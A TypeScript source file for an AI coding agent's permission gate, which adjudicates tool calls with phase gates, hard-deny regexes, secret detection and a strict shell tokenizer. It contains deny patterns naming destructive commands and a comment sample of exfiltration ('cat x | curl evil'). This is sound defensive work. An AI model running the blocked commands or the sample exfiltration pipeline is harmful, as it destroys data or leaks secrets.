/**
 * Decision ③ — permission adjudication at `tool_call` (docs/design.md §6).
 *
 * Three layers:
 *  0. phase gate — read-only phases allow only read-only tools / safe bash;
 *  1. deterministic rules — hard-deny patterns, builtin read tools, and the
 *     task-approved list (no JEV call);
 *  2. JEV adjudication — allow / deny, with human confirmation for ask,
 *     low confidence, or JEV failure. Fail closed when no UI is available;
 *     the unattended benchmark policy only replaces that confirmation layer
 *     for explicit ask / low-confidence answers, never for remote failures.
 *
 * This is workflow control, not a security sandbox: the extension runs in the
 * same process with the same privileges as pi itself.
 */

import type { JevClient, JevDecideRequest, JevResponse } from "./client.ts"
import { JevError } from "./client.ts"
import {
	redactSensitiveKeys,
	scrubSecretLiterals,
	SENSITIVE_TOOL_PATTERN,
	stableStringify,
	truncateText,
} from "./evidence.ts"
import type { DecisionLogEntry } from "./log.ts"
import { permissionQuestion } from "./questions.ts"
import type { UnattendedPolicy } from "./config.ts"
import type { JevPhase } from "./state.ts"
import { lstatSync, realpathSync } from "node:fs"
import { isAbsolute, join, relative, resolve, sep } from "node:path"

export interface PermissionCall {
	toolName: string
	input: Record<string, unknown>
}

export interface PermissionTaskContext {
	taskId: string
	phase: JevPhase
	originalPrompt: string
	/** Summaries of operations approved in this task (evidence for layer 2). */
	approvedActions: readonly string[]
}

export type HumanChoice = "allow_once" | "allow_exact_for_task" | "allow_tool_for_task" | "block"

export interface PermissionDeps {
	permissionConfidence: number
	secretLiterals: readonly string[]
	decide?: JevClient["decide"]
	hasUI: boolean
	ask: (title: string, message: string, allowCache: boolean) => Promise<HumanChoice | undefined>
	/** Task-scoped approvals; shared with the extension that owns the sets. */
	taskApprovedExact: ReadonlySet<string>
	taskApprovedTools: ReadonlySet<string>
	onLog: (entry: Omit<DecisionLogEntry, "timestamp">) => void
	/** Working directory for repo-locality checks in unattended mode. */
	cwd?: string
	/** Behaviour when no UI is available for human confirmation. */
	unattendedPolicy?: UnattendedPolicy
}

export interface PermissionVerdict {
	/** undefined result = allow (return nothing from the hook). */
	block: boolean
	reason?: string
	terminate?: boolean
	source: string
}

const ALLOW = (source: string): PermissionVerdict => ({ block: false, source })
const BLOCK = (source: string, reason: string, terminate = false): PermissionVerdict => ({
	block: true,
	reason,
	terminate,
	source,
})

/** Layer 1 hard-deny patterns for bash commands (from pi's permission-gate example). */
export const HARD_DENY_PATTERNS: readonly RegExp[] = [
	/\brm\s+(-rf?|--recursive)/i,
	/\bsudo\b/i,
	/\b(chmod|chown)\b.*777/i,
]

/** Layer 1 always-allow builtin read tools (plus the interactive questionnaire, which only asks the user). */
export const BUILTIN_READ_TOOLS: ReadonlySet<string> = new Set(["read", "grep", "find", "ls", "questionnaire"])

/** Tools allowed during read-only phases (layer 0), bash gated by isSafeCommand. */
const PHASE_READ_ONLY_TOOLS: ReadonlySet<string> = new Set([
	"read",
	"grep",
	"find",
	"ls",
	"questionnaire",
	"pwd",
])

// Read-only bash allowlist, migrated from pi's plan-mode example (utils.ts).
const SAFE_PATTERNS: readonly RegExp[] = [
	/^\s*cat\b/,
	/^\s*head\b/,
	/^\s*tail\b/,
	/^\s*less\b/,
	/^\s*more\b/,
	/^\s*grep\b/,
	/^\s*find\b/,
	/^\s*ls\b/,
	/^\s*pwd\b/,
	/^\s*echo\b/,
	/^\s*printf\b/,
	/^\s*wc\b/,
	/^\s*sort\b/,
	/^\s*uniq\b/,
	/^\s*diff\b/,
	/^\s*file\b/,
	/^\s*stat\b/,
	/^\s*du\b/,
	/^\s*df\b/,
	/^\s*tree\b/,
	/^\s*which\b/,
	/^\s*whereis\b/,
	/^\s*type\b/,
	// No env/printenv: dumping KEY=value environment text would flow into JEV
	// evidence as plain strings that key redaction cannot catch.
	/^\s*uname\b/,
	/^\s*whoami\b/,
	/^\s*id\b/,
	/^\s*date\b/,
	/^\s*cal\b/,
	/^\s*uptime\b/,
	/^\s*ps\b/,
	/^\s*git\s+(status|log|diff|show|branch|remote|config\s+--get)/i,
	/^\s*git\s+ls-/i,
	/^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
	/^\s*yarn\s+(list|info|why|audit)/i,
	/^\s*node\s+--version/i,
	/^\s*python\s+--version/i,
	/^\s*jq\b/,
	/^\s*sed\s+-n/i,
	/^\s*awk\b/,
	/^\s*rg\b/,
	/^\s*fd\b/,
	/^\s*bat\b/,
]

const DESTRUCTIVE_PATTERNS: readonly RegExp[] = [
	/\brm\b/i,
	/\brmdir\b/i,
	/\bmv\b/i,
	/\bcp\b/i,
	/\bmkdir\b/i,
	/\btouch\b/i,
	/\bchmod\b/i,
	/\bchown\b/i,
	/\bchgrp\b/i,
	/\bln\b/i,
	/\btee\b/i,
	/\btruncate\b/i,
	/\bdd\b/i,
	/\bshred\b/i,
	/(^|[^<])>(?!>)/,
	/>>/,
	/\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
	/\byarn\s+(add|remove|install|publish)/i,
	/\bpnpm\s+(add|remove|install|publish)/i,
	/\bpip\s+(install|uninstall)/i,
	/\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
	/\bbrew\s+(install|uninstall|upgrade)/i,
	/\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dD]|stash|cherry-pick|revert|tag|init|clone)/i,
	/\bsudo\b/i,
	/\bsu\b/i,
	/\bkill\b/i,
	/\bpkill\b/i,
	/\bkillall\b/i,
	/\breboot\b/i,
	/\bshutdown\b/i,
	/\bsystemctl\s+(start|stop|restart|enable|disable)/i,
	/\bservice\s+\S+\s+(start|stop|restart)/i,
	/\b(vim?|nano|emacs|code|subl)\b/i,
]

export function isSafeCommand(command: string): boolean {
	const isDestructive = DESTRUCTIVE_PATTERNS.some((p) => p.test(command))
	const isSafe = SAFE_PATTERNS.some((p) => p.test(command))
	return !isDestructive && isSafe
}

/** Key identifying "same tool with same normalized input" for task approval. */
export function approvalKey(call: PermissionCall): string {
	return `${call.toolName}:${stableStringify(redactSensitiveKeys(call.input))}`
}

const SENSITIVE_COMMAND_PATTERNS: readonly RegExp[] = [
	/\b(?:authorization|proxy-authorization)\s*:/i,
	/\bbearer\s+[A-Za-z0-9._~+\/-]{8,}/i,
	/\b(?:api[_-]?key|access[_-]?token|token|secret|password)\s*=\s*\S+/i,
	/-----BEGIN [A-Z ]*PRIVATE KEY-----/i,
]

export function sensitivePermissionInput(call: PermissionCall, secrets: readonly string[]): boolean {
	const serialized = stableStringify(redactSensitiveKeys(call.input))
	if (SENSITIVE_TOOL_PATTERN.test(serialized)) return true
	const command = bashCommandOf(call.input)
	if (command === undefined) return false
	if (SENSITIVE_COMMAND_PATTERNS.some((pattern) => pattern.test(command))) return true
	return secrets.some((secret) => secret.length >= 8 && command.includes(secret))
}

export function sanitizedPermissionInput(call: PermissionCall, secrets: readonly string[]): string {
	let serialized = scrubSecretLiterals(stableStringify(redactSensitiveKeys(call.input)), secrets)
	serialized = serialized.replace(
		/(\b(?:authorization|proxy-authorization)\s*:\s*(?:bearer\s+)?)[^"'\s]+/gi,
		"$1[redacted]",
	)
	serialized = serialized.replace(/(\bbearer\s+)[A-Za-z0-9._~+\/-]+/gi, "$1[redacted]")
	serialized = serialized.replace(
		/(\b(?:api[_-]?key|access[_-]?token|token|secret|password)\s*=\s*)[^&\s"']+/gi,
		"$1[redacted]",
	)
	return serialized
}

/**
 * Structured evidence for the permission decision. edit/write carry only
 * operation metadata (path, scope, content size) instead of code bodies: the
 * gate judges authorization and risk, not code quality, and the full body
 * would inflate tokens, leak code to the decision model, and blur the
 * decision with content it must not evaluate. bash keeps the full sanitized
 * command (plus cwd) since the command IS the risk. Other tools fall back to
 * the sanitized serialization.
 */
function structuredToolEvidence(
	call: PermissionCall,
	sanitizedInput: string,
	secrets: readonly string[],
	cwd: string | undefined,
): unknown {
	const input = call.input
	const record = typeof input === "object" && input !== null && !Array.isArray(input) ? (input as Record<string, unknown>) : {}

	if (call.toolName === "edit" || call.toolName === "write") {
		const path = typeof record.path === "string" ? record.path : undefined
		let contentSize: number | undefined
		if (call.toolName === "write") {
			contentSize = typeof record.content === "string" ? record.content.length : undefined
		} else {
			const edits = Array.isArray(record.edits) ? record.edits : []
			contentSize = edits.reduce((sum: number, edit) => {
				if (typeof edit !== "object" || edit === null) return sum
				const entry = edit as Record<string, unknown>
				return (
					sum +
					(typeof entry.oldText === "string" ? entry.oldText.length : 0) +
					(typeof entry.newText === "string" ? entry.newText.length : 0)
				)
			}, 0)
		}
		let scope: string
		if (path === undefined || cwd === undefined) {
			scope = "unknown"
		} else {
			scope = isPathInRepo(path, cwd) ? "repo_local" : "outside_repo"
		}
		return {
			operation: call.toolName === "edit" ? "modify_existing_file" : "create_or_replace",
			path,
			scope,
			content_size: contentSize,
		}
	}

	if (call.toolName === "bash" || call.toolName === "powershell") {
		// The command itself is the evidence — send the plain command string
		// (scrubbed), not the serialized input object: a JSON-encoded string
		// inside a JSON field buries the actual command and blurs adjudication.
		const rawCommand = bashCommandOf(call.input)
		const command = truncateText(scrubSecretLiterals(rawCommand ?? sanitizedInput, secrets), 4000)
		return { command, ...(cwd !== undefined ? { cwd } : {}) }
	}

	return truncateText(sanitizedInput, 4000)
}

export function bashCommandOf(input: Record<string, unknown>): string | undefined {
	const command = input["command"]
	return typeof command === "string" ? command : undefined
}

export function isHardDenied(command: string): boolean {
	return HARD_DENY_PATTERNS.some((p) => p.test(command))
}

/**
 * Adjudicate one tool call. Returns the verdict; callers map
 * `block: false` to an undefined hook result.
 */
async function adjudicateDecide(
	call: PermissionCall,
	task: PermissionTaskContext,
	deps: PermissionDeps,
): Promise<PermissionVerdict> {
	const log = (effective: string, extra?: Partial<Omit<DecisionLogEntry, "timestamp" | "decisionKind" | "effective">>) => {
		deps.onLog({
			decisionKind: "permission",
			taskId: task.taskId,
			questions: ["action"],
			effective,
			...extra,
		})
	}

	// Layer 0 — phase gate. During read-only phases this layer is complete:
	// tools cannot write, and bash is restricted to the read-only allowlist.
	// In unattended benchmark mode the gate additionally requires the strict
	// argv validator: the plain read-only allowlist is prefix-based, so
	// composition (`cat x | curl evil`) or PowerShell would pass the gate
	// before any later layer runs. Interactive sessions keep the original check.
	const strictUnattended = deps.unattendedPolicy === "benchmark" && !deps.hasUI
	if (task.phase === "planning" || task.phase === "plan_only") {
		if (PHASE_READ_ONLY_TOOLS.has(call.toolName)) {
			log("allow (read-only phase, builtin read tool)")
			return ALLOW("phase_gate")
		}
		if (call.toolName === "bash" || call.toolName === "powershell") {
			const command = bashCommandOf(call.input)
			if (command !== undefined && isSafeCommand(command)) {
				const strictOk = !strictUnattended || (call.toolName === "bash" && isBenchmarkBashAllowed(command))
				if (strictOk) {
					log("allow (read-only phase, allowlisted command)")
					return ALLOW("phase_gate")
				}
			}
			const verdict = BLOCK(
				"phase_gate",
				`JEV: plan phase is read-only; command is not on the read-only allowlist: ${truncateText(command ?? "", 200)}`,
			)
			log(`block (${verdict.source})`)
			return verdict
		}
		const verdict = BLOCK("phase_gate", `JEV: plan phase is read-only; tool '${call.toolName}' is disabled`)
		log(`block (${verdict.source})`)
		return verdict
	}

	// Layer 1 — deterministic rules.
	if (call.toolName === "bash" || call.toolName === "powershell") {
		const command = bashCommandOf(call.input)
		if (command !== undefined && isHardDenied(command)) {
			const verdict = BLOCK(
				"hard_deny",
				`JEV: command matches a hard-deny pattern and will not execute: ${truncateText(command, 200)}`,
			)
			log(`block (hard_deny)`)
			return verdict
		}
	}
	if (BUILTIN_READ_TOOLS.has(call.toolName)) {
		log("allow (builtin read tool)")
		return ALLOW("builtin_allow")
	}
	if (deps.taskApprovedTools.has(call.toolName) || deps.taskApprovedExact.has(approvalKey(call))) {
		log("allow (approved for this task)")
		return ALLOW("task_approved")
	}

	const secretLiterals = deps.secretLiterals
	const sensitive = sensitivePermissionInput(call, secretLiterals)
	const sanitizedInput = sanitizedPermissionInput(call, secretLiterals)

	// Layer 2 — JEV adjudication. Every outgoing task prompt is scrubbed, the
	// same invariant as the route and outcome paths. Tool input goes out as
	// structured evidence (operation metadata for edit/write, the command for
	// bash) rather than raw serialized bodies.
	const request: JevDecideRequest = {
		state: {
			task_prompt: scrubSecretLiterals(truncateText(task.originalPrompt, 2000), deps.secretLiterals),
			tool_name: call.toolName,
			tool_input: structuredToolEvidence(call, sanitizedInput, deps.secretLiterals, deps.cwd),
			approved_operations: task.approvedActions.map((a) => truncateText(a, 200)),
		},
		questions: { action: permissionQuestion },
	}

	let response: JevResponse | undefined
	let errorReason: string | undefined
	if (sensitive) {
		errorReason = "sensitive_input_local_only"
	} else if (deps.decide === undefined) {
		errorReason = "jev_unavailable"
	} else {
		try {
			response = await deps.decide(request)
		} catch (error) {
			errorReason = error instanceof JevError ? String(error.reason) : "transport_or_schema_error"
		}
	}

	if (response !== undefined) {
		const answer = response.answers["action"]
		if (answer?.type === "choice") {
			if (answer.choice === "allow" && answer.confidence >= deps.permissionConfidence) {
				log("allow (jev)", {
					answers: { action: { type: "choice", value: answer.choice, confidence: answer.confidence } },
					latencyMs: response.latencyMs,
					usage: response.usage,
				})
				return ALLOW("jev_allow")
			}
			if (answer.choice === "deny") {
				const verdict = BLOCK(
					"jev_deny",
					`JEV: call denied (confidence ${answer.confidence.toFixed(2)}): operation is clearly prohibited or malicious`,
					true,
				)
				log(`block (jev_deny, confidence ${answer.confidence.toFixed(2)})`, {
					answers: { action: { type: "choice", value: answer.choice, confidence: answer.confidence } },
					latencyMs: response.latencyMs,
					usage: response.usage,
				})
				return verdict
			}
			// "ask" or low confidence falls through to the human gate.
		}
	}

	// Ask / low confidence / JEV failure: human decides; fail closed without UI
	// unless an unattended policy has been explicitly configured. The unattended
	// fallback replaces only this confirmation layer: it is reachable exclusively
	// after an explicit JEV answer (`ask` or low-confidence `allow`). Failures,
	// timeouts, unavailable adjudication, sensitive input, and malformed answers
	// stay fail-closed — an absent verdict must never read as permission.
	if (!deps.hasUI) {
		const jevAnswered = response !== undefined && response.answers["action"]?.type === "choice"
		if (deps.unattendedPolicy === "benchmark" && jevAnswered) {
			return adjudicateUnattended(call, {
				sensitive,
				cwd: deps.cwd ?? process.cwd(),
				onLog: (entry) => deps.onLog({
					...entry,
					answers: response?.answers.action?.type === "choice"
						? { action: { type: "choice", value: response.answers.action.choice, confidence: response.answers.action.confidence } }
						: {},
					latencyMs: response?.latencyMs,
					usage: response?.usage,
				}),
				taskId: task.taskId,
			})
		}
		const failReason = errorReason ?? "invalid_answers"
		const verdict = BLOCK(
			"fail_closed",
			`JEV: needs confirmation and no UI is available; blocked (fail closed) [${failReason}]`,
		)
		log(`block (fail_closed, ${failReason})`, {
			error: failReason,
			...(response !== undefined ? { latencyMs: response.latencyMs, usage: response.usage } : {}),
		})
		return verdict
	}

	const title = "JEV permission gate"
	const message = [
		`Tool: ${call.toolName}`,
		`Arguments: ${truncateText(sanitizedInput, 500)}`,
		`Task: ${truncateText(task.originalPrompt, 300)}`,
		errorReason !== undefined
			? errorReason === "sensitive_input_local_only"
				? "Sensitive input was kept local; manual confirmation is required."
				: `JEV adjudication unavailable (${errorReason}); manual confirmation required.`
			: "JEV requested confirmation for this call.",
	].join("\n")
	const choice = await deps.ask(title, message, !sensitive)

	if (choice !== undefined && choice !== "block") {
		const effectiveChoice = sensitive ? "allow_once" : choice
		log(`allow (human, ${effectiveChoice})`, response === undefined ? {} : { latencyMs: response.latencyMs, usage: response.usage })
		return { block: false, source: `human_${effectiveChoice}` }
	}
	const verdict = BLOCK("human_block", "Blocked by user")
	log("block (human)", response === undefined ? {} : { latencyMs: response.latencyMs, usage: response.usage })
	return verdict
}

/**
 * Public entry — adjudication with the allow-all shadow override.
 *
 * With `PI_JEV_UNATTENDED_POLICY=allow-all` and no UI, the full chain still
 * runs and every verdict — including blocks from the phase gate, hard-deny,
 * sensitive checks, and the unattended fallback — is logged for offline
 * analysis, but blocks are not enforced: the evaluation policy overrides
 * them so permission never gates the run. Interactive sessions and the
 * other policies are unaffected.
 */
export async function adjudicate(
	call: PermissionCall,
	task: PermissionTaskContext,
	deps: PermissionDeps,
): Promise<PermissionVerdict> {
	const verdict = await adjudicateDecide(call, task, deps)
	if (verdict.block && !deps.hasUI && deps.unattendedPolicy === "allow-all") {
		deps.onLog({
			decisionKind: "permission",
			taskId: task.taskId,
			questions: ["action"],
			effective: `allow (allow-all override of ${verdict.source})`,
		})
		return { block: false, source: "allow_all_override" }
	}
	return verdict
}

// ---------------------------------------------------------------------------
// Unattended benchmark fallback (docs/design.md §6)
// ---------------------------------------------------------------------------

interface UnattendedDeps {
	sensitive: boolean
	cwd: string
	onLog: (entry: Omit<DecisionLogEntry, "timestamp">) => void
	taskId: string
}

/**
 * Deterministic fallback for `!hasUI` when `PI_JEV_UNATTENDED_POLICY=benchmark`.
 *
 * Only reached when JEV explicitly answered `ask` or returned a low-confidence
 * `allow`. Remote failures, timeouts, unavailable adjudication, sensitive
 * input, and malformed answers are fail-closed before this function is
 * consulted; the checks below are defence in depth.
 *
 * Default stance is **block** — only operations explicitly listed as
 * benchmark-safe are allowed.
 */
function adjudicateUnattended(
	call: PermissionCall,
	deps: UnattendedDeps,
): PermissionVerdict {
	const log = (effective: string, extra?: Partial<Omit<DecisionLogEntry, "timestamp" | "decisionKind" | "effective">>) => {
		deps.onLog({
			decisionKind: "permission",
			taskId: deps.taskId,
			questions: ["action"],
			effective,
			...extra,
		})
	}

	if (deps.sensitive) {
		const verdict = BLOCK("unattended_block", "unattended: sensitive input requires human confirmation")
		log(`block (unattended, sensitive_input)`)
		return verdict
	}

	if (call.toolName === "powershell") {
		// PowerShell has different syntax than POSIX shell and no dedicated
		// parser here yet; keep it out of the unattended allowlist entirely.
		const verdict = BLOCK("unattended_block", "unattended: powershell requires human confirmation")
		log(`block (unattended, powershell_not_supported)`)
		return verdict
	}

	if (call.toolName === "bash") {
		const command = bashCommandOf(call.input)
		if (command === undefined) {
			const verdict = BLOCK("unattended_block", "unattended: bash call without command string")
			log(`block (unattended, no_command)`)
			return verdict
		}
		if (isHardDenied(command)) {
			const verdict = BLOCK("unattended_block", `unattended: command matches hard-deny pattern`)
			log(`block (unattended, hard_deny)`)
			return verdict
		}
		if (isBenchmarkBashAllowed(command)) {
			log(`allow (unattended, benchmark_bash)`)
			return ALLOW("unattended_allow")
		}
		const verdict = BLOCK("unattended_block", `unattended: bash command not in benchmark allowlist`)
		log(`block (unattended, bash_not_allowed)`)
		return verdict
	}

	if (call.toolName === "edit" || call.toolName === "write" || call.toolName === "patch") {
		const filePath = filePathOf(call.input)
		if (filePath !== undefined && isPathInRepo(filePath, deps.cwd)) {
			log(`allow (unattended, repo_local_${call.toolName})`)
			return ALLOW("unattended_allow")
		}
		const verdict = BLOCK(
			"unattended_block",
			`unattended: ${call.toolName} path is outside repo, unresolved, or protected (.git, symlinks, ..)`,
		)
		log(`block (unattended, path_outside_repo)`)
		return verdict
	}

	// Any other tool not covered by deterministic rules or JEV high-confidence.
	const verdict = BLOCK("unattended_block", `unattended: tool '${call.toolName}' not in benchmark allowlist`)
	log(`block (unattended, unknown_tool)`)
	return verdict
}

/**
 * Check whether a file path really resolves inside the repo working directory,
 * without ever following a symlink.
 *
 * The kernel resolves `link/..` against the link *target*, and a write through
 * a dangling symlink creates the target file — so a lexical check or a
 * realpath of the existing prefix can both be fooled. Instead: raw `..`
 * components are refused, every existing component must be a real directory
 * (a symlink component, dangling or not, is fail-closed), and only a missing
 * tail may describe new files — nothing exists below a missing component, so
 * no symlink can redirect it. `.git` components are refused as well: writing
 * config, hooks, or attributes there can turn later allowlisted git commands
 * into arbitrary execution.
 */
function isPathInRepo(filePath: string, cwd: string): boolean {
	let repoRoot: string
	try {
		repoRoot = realpathSync(cwd)
	} catch {
		return false
	}
	if (/^[A-Za-z]:/.test(filePath)) return false
	let segments = filePath.split(/[\\/]+/).filter((segment) => segment !== "" && segment !== ".")
	if (segments.some((segment) => segment === ".." || segment === ".git")) return false
	let base = filePath.startsWith("/") ? "/" : repoRoot
	// Trust the caller's cwd alias (e.g. macOS /var -> /private/var), but still
	// reject every symlink below that root, including dangling file symlinks.
	if (filePath.startsWith("/")) {
		const rel = relative(resolve(cwd), filePath)
		if (rel !== ".." && !rel.startsWith(`..${sep}`) && !isAbsolute(rel)) {
			base = repoRoot
			segments = rel.split(sep).filter(Boolean)
		}
	}
	let current = base
	for (let i = 0; i < segments.length; i += 1) {
		current = join(current, segments[i]!)
		let stats: ReturnType<typeof lstatSync>
		try {
			stats = lstatSync(current)
		} catch (error) {
			// A missing component ends the walk: everything below it is new and
			// cannot be redirected by anything on disk.
			if ((error as NodeJS.ErrnoException).code === "ENOENT") break
			return false
		}
		if (stats.isSymbolicLink()) return false
		if (i < segments.length - 1 && !stats.isDirectory()) return false
	}
	const rel = relative(repoRoot, join(base, ...segments))
	return rel !== "" && rel !== ".." && !rel.startsWith(`..${sep}`) && !isAbsolute(rel)
}

/**
 * Bash command classification for unattended benchmark mode.
 *
 * Prefix matching alone cannot make a command safe: substitution, quoting, an
 * unquoted glob, or an innocuous-looking flag can smuggle a payload past it.
 * A command must pass two structural checks instead: it has to tokenize as a
 * conservative subset of POSIX shell (no `$`, backticks, newlines, pipes,
 * redirects, `&`, `;`, `()`, `{}`, or unquoted glob characters), and the
 * resulting argv has to match a per-command read-only argument allowlist.
 * Commands whose argument grammar is too rich to approximate (sed, awk, fd)
 * are left out of the allowlist entirely.
 */
function isBenchmarkBashAllowed(command: string): boolean {
	const argv = tokenizeCommand(command)
	if (argv === undefined || argv.length === 0) return false
	const [name, ...args] = argv
	if (name === undefined) return false

	if (isBenchmarkTestCommand(name, args)) return true
	if (name === "git") return isSafeGitCommand(args)
	if (isVersionQuery(name, args)) return true
	if (BENCHMARK_READ_ONLY_COMMANDS.has(name)) return readOnlyArgsAreSafe(name, args)

	return false
}

/**
 * Shell metacharacters that must never appear unquoted. Inside double quotes,
 * `$` and backticks are rejected as well (bash still expands them there);
 * single-quoted text is inert to the shell and checked per command instead.
 */
const SHELL_METACHARACTERS = new Set(["|", "&", ";", "<", ">", "(", ")", "{", "}", "$", "`"])

/** Glob characters bash would expand after validation; refused when unquoted. */
const UNQUOTED_GLOB_CHARACTERS = new Set(["*", "?", "[", "]"])

/**
 * Split a command into argv-style words, or return undefined when it uses any
 * shell construct beyond quoting and plain arguments. Intentionally a
 * conservative subset of POSIX shell: everything fancy is refused instead of
 * interpreted. Unquoted glob characters (`*`, `?`, `[`, `]`) are refused as
 * well: bash expands them *after* this validation, so the argv that runs would
 * no longer be the argv that was checked. Quoted or backslash-escaped glob
 * characters are literal to bash and stay allowed.
 */
function tokenizeCommand(command: string): string[] | undefined {
	if (command.includes("\n") || command.includes("\r")) return undefined
	const tokens: string[] = []
	let current = ""
	let inWord = false
	let quote: "'" | '"' | undefined
	for (let i = 0; i < command.length; i += 1) {
		const ch = command[i]!
		if (quote === "'") {
			if (ch === "'") quote = undefined
			else current += ch
			continue
		}
		if (quote === '"') {
			if (ch === '"') {
				quote = undefined
			} else if (ch === "\\") {
				const next = command[i + 1]
				if (next === '"' || next === "\\" || next === "$" || next === "`") {
					current += next
					i += 1
				} else {
					// Backslash keeps its literal meaning before other characters.
					current += ch
				}
			} else if (ch === "$" || ch === "`") {
				return undefined
			} else {
				current += ch
			}
			continue
		}
		if (ch === "'" || ch === '"') {
			quote = ch
			inWord = true
			continue
		}
		if (ch === " " || ch === "\t") {
			if (inWord) {
				tokens.push(current)
				current = ""
				inWord = false
			}
			continue
		}
		if (ch === "\\") {
			const next = command[i + 1]
			// An escaped metacharacter would otherwise slip past the check below.
			if (next === undefined || SHELL_METACHARACTERS.has(next)) return undefined
			current += next
			inWord = true
			i += 1
			continue
		}
		if (SHELL_METACHARACTERS.has(ch)) return undefined
		if (UNQUOTED_GLOB_CHARACTERS.has(ch)) return undefined
		current += ch
		inWord = true
	}
	if (quote !== undefined) return undefined
	if (inWord) tokens.push(current)
	return tokens
}

/** Test runners are benchmark-safe by design (executing tests is the job). */
function isBenchmarkTestCommand(name: string, args: readonly string[]): boolean {
	if (name === "pytest" || name === "tox") return true
	if (name === "python" || name === "python3") {
		return args[0] === "-m" && (args[1] === "pytest" || args[1] === "unittest")
	}
	if (name === "npm" || name === "yarn" || name === "pnpm") return args[0] === "test"
	if (name === "make") return args[0] === "test"
	if (name === "npx") return args[0] === "vitest" || args[0] === "jest" || args[0] === "mocha"
	return false
}

/** Read-only git subcommands allowed in unattended mode. */
const BENCHMARK_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
	"status",
	"diff",
	"log",
	"show",
	"branch",
	"remote",
	"ls-files",
	"ls-tree",
	"ls-remote",
	"rev-parse",
	"merge-base",
	"cat-file",
	"blame",
	"shortlog",
	"rev-list",
	"describe",
])

/**
 * `git branch` only lists when every argument is one of these flags; a
 * positional argument creates a branch and `-d`/`-D`/`-m`/`-M`/`-c`/`-C`/`-f`
 * mutate state, so anything else is refused.
 */
const GIT_BRANCH_LISTING_FLAGS: ReadonlySet<string> = new Set([
	"-a",
	"-r",
	"-v",
	"-vv",
	"-l",
	"--list",
	"--all",
	"--remotes",
	"--verbose",
	"--show-current",
	"--color",
	"--no-color",
	"--column",
	"--no-column",
])

function isSafeGitCommand(args: readonly string[]): boolean {
	const [sub, ...rest] = args
	if (sub === undefined || !BENCHMARK_GIT_SUBCOMMANDS.has(sub)) return false
	if (sub === "branch") return rest.every((arg) => GIT_BRANCH_LISTING_FLAGS.has(arg))
	if (sub === "remote") return rest.every((arg) => arg === "-v" || arg === "--verbose")
	if (sub === "diff" || sub === "log" || sub === "show") {
		// `--output=<file>` turns inspection into a file write; `--ext-diff` and
		// `--textconv` run external diff drivers. (Config-based drivers are
		// closed off separately: `.git` metadata is not writable unattended.)
		return !rest.some(
			(arg) =>
				arg === "--output" ||
				arg.startsWith("--output=") ||
				arg === "--ext-diff" ||
				arg === "--textconv",
		)
	}
	if (sub === "cat-file") {
		// `--textconv` / `--filters` run configured conversion commands.
		return !rest.some((arg) => arg === "--textconv" || arg === "--filters")
	}
	return true
}

function isVersionQuery(name: string, args: readonly string[]): boolean {
	const flag = args[0]
	if (name === "java") return flag === "-version"
	if (name === "go") return flag === "version"
	if (["python", "python3", "node", "npm", "ruby", "cargo"].includes(name)) return flag === "--version"
	return false
}

/** Read-only shell commands allowed during unattended benchmark execution. */
const BENCHMARK_READ_ONLY_COMMANDS: ReadonlySet<string> = new Set([
	"cat",
	"head",
	"tail",
	"grep",
	"find",
	"ls",
	"pwd",
	"wc",
	"sort",
	"uniq",
	"diff",
	"file",
	"stat",
	"du",
	"df",
	"tree",
	"which",
	"whereis",
	"type",
	"uname",
	"whoami",
	"id",
	"date",
	"uptime",
	"ps",
	"jq",
	"rg",
	"bat",
])

/** Argument-level checks for read-only commands with write or exec hooks. */
function readOnlyArgsAreSafe(name: string, args: readonly string[]): boolean {
	switch (name) {
		case "find":
			// Predicates that execute commands or write files.
			return !args.some((arg) => /^-(exec|execdir|ok|okdir|delete|fprint|fprint0|fprintf|fls)$/.test(arg))
		case "sort":
			// `-o <file>` / `--output=<file>` write files; `--compress-program`
			// executes an external program for temporary files.
			return !args.some(
				(arg) =>
					arg === "-o" ||
					arg === "--output" ||
					arg.startsWith("--output=") ||
					arg.startsWith("--compress-program") ||
					/^-o.+/.test(arg),
			)
		case "tree":
			// `-o <file>` / `--output=<file>` write files.
			return !args.some(
				(arg) => arg === "-o" || arg === "--output" || arg.startsWith("--output=") || /^-o.+/.test(arg),
			)
		case "uniq":
			// `uniq <input> <output>` writes its second positional argument.
			return args.filter((arg) => !arg.startsWith("-")).length <= 1
		case "rg":
			// `--pre <command>` executes a command per file.
			return !args.some((arg) => arg === "--pre" || arg.startsWith("--pre="))
		case "diff":
			// `-o <file>` / `--output=<file>` would turn comparison into a write
			// on tools that accept them.
			return !args.some(
				(arg) => arg === "-o" || arg === "--output" || arg.startsWith("--output=") || /^-o.+/.test(arg),
			)
		case "date":
			// `-s` / `--set` changes the system clock; catch attached values
			// (`-s@0`, `-us`) instead of only the bare flag.
			return !args.some((arg) => /^-[^-]*s/.test(arg) || arg.startsWith("--set"))
		case "bat":
			// `--pager` lets the caller choose a command to execute.
			return !args.some((arg) => arg === "--pager" || arg.startsWith("--pager="))
		default:
			return true
	}
}

/** Extract a file path from edit/write/patch tool input. */
function filePathOf(input: Record<string, unknown>): string | undefined {
	const p = input["path"] ?? input["file"] ?? input["filePath"]
	return typeof p === "string" ? p : undefined
}
